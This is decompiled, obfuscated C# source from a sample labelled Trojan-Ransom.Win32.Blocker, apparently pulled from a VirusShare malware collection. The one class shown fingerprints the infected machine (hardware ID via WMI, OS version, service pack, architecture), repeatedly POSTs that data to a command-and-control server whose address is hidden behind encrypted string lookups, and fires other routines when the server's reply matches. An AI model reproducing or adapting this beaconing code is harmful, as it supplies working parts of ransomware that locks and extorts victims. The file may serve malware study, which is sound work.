// Decompiled with JetBrains decompiler
// Type: 
// Assembly: AV, Version=2.0.5.0, Culture=neutral, PublicKeyToken=null
// MVID: 56F2F6CB-C947-430A-8E47-6539AD6C5806
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\Trojan-Ransom.Win32.Blocker.lavj-da251cb9358d6e9aaf7cf1499e2912744800b0ad4fe523a6f79298565ec0ebb7.exe

using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text.RegularExpressions;
using System.Threading;

internal sealed class \u0008
{
  private \u0003\u2003 \u0002;
  private \u000F\u2002 \u0003;

  public \u0008(\u0003\u2003 _param1, \u000F\u2002 _param2)
  {
    this.\u0002 = _param1;
    this.\u0003 = _param2;
  }

  public void \u0002()
  {
    while (true)
    {
      string str = this.\u0002();
      char[] chArray = new char[1]{ '\n' };
      foreach (string input in str.Split(chArray))
      {
        Match match = Regex.Match(input, \u0005\u2003.\u0002(1603296583), RegexOptions.Singleline);
        if (match.Groups.Count > 1 && match.Groups[1].Value == \u0008\u2000.\u0005)
        {
          this.\u0002.\u0002();
          this.\u0003.\u0003();
          \u0003\u2003.\u0002();
        }
      }
      Thread.Sleep(\u0008\u2000.\u0006);
    }
  }

  private string \u0002()
  {
    try
    {
      WebRequest webRequest = WebRequest.Create(\u0008\u2000.\u0008);
      webRequest.Method = \u0005\u2003.\u0002(1603296575);
      string str = \u0005\u2003.\u0002(1603296560) + Uri.EscapeDataString(\u0008.\u0002()) + \u0005\u2003.\u0002(1603296541) + Uri.EscapeDataString(\u0008\u2000.\u0003) + \u0005\u2003.\u0002(1603296749) + Uri.EscapeDataString(this.\u0003()) + \u0005\u2003.\u0002(1603296738) + Uri.EscapeDataString(this.\u0005()) + \u0005\u2003.\u0002(1603296752) + Uri.EscapeDataString(this.\u0002().ToString());
      webRequest.ContentType = \u0005\u2003.\u0002(1603296704);
      webRequest.ContentLength = (long) str.Length;
      StreamWriter streamWriter = new StreamWriter(webRequest.GetRequestStream());
      streamWriter.Write(str);
      streamWriter.Close();
      HttpWebResponse response = (HttpWebResponse) webRequest.GetResponse();
      StreamReader streamReader = new StreamReader(response.GetResponseStream());
      string end = streamReader.ReadToEnd();
      response.Close();
      streamReader.Close();
      return end;
    }
    catch
    {
      return string.Empty;
    }
  }

  public static string \u0002()
  {
    ManagementObject managementObject = new ManagementObject(\u0005\u2003.\u0002(1603296696));
    managementObject.Get();
    return managementObject[\u0005\u2003.\u0002(1603296662)].ToString();
  }

  private int \u0002()
  {
    string environmentVariable = Environment.GetEnvironmentVariable(\u0005\u2003.\u0002(1603295865));
    return !string.IsNullOrEmpty(environmentVariable) && string.Compare(environmentVariable, 0, \u0005\u2003.\u0002(1603295836), 0, 3, true) != 0 ? 64 : 32;
  }

  private string \u0003()
  {
    OperatingSystem osVersion = Environment.OSVersion;
    Version version = osVersion.Version;
    string str = string.Empty;
    if (osVersion.Platform == PlatformID.Win32Windows)
    {
      switch (version.Minor)
      {
        case 0:
          str = \u0005\u2003.\u0002(1603295830);
          break;
        case 10:
          str = !(version.Revision.ToString() == \u0005\u2003.\u0002(1603295785)) ? \u0005\u2003.\u0002(1603295798) : \u0005\u2003.\u0002(1603295805);
          break;
        case 90:
          str = \u0005\u2003.\u0002(1603295753);
          break;
      }
    }
    else if (osVersion.Platform == PlatformID.Win32NT)
    {
      switch (version.Major)
      {
        case 3:
          str = \u0005\u2003.\u0002(1603295744);
          break;
        case 4:
          str = \u0005\u2003.\u0002(1603295766);
          break;
        case 5:
          str = version.Minor != 0 ? \u0005\u2003.\u0002(1603295998) : \u0005\u2003.\u0002(1603295973);
          break;
        case 6:
          str = version.Minor != 0 ? \u0005\u2003.\u0002(1603295941) : \u0005\u2003.\u0002(1603295985);
          break;
      }
    }
    return str;
  }

  private string \u0005() => Environment.OSVersion.ServicePack;
}
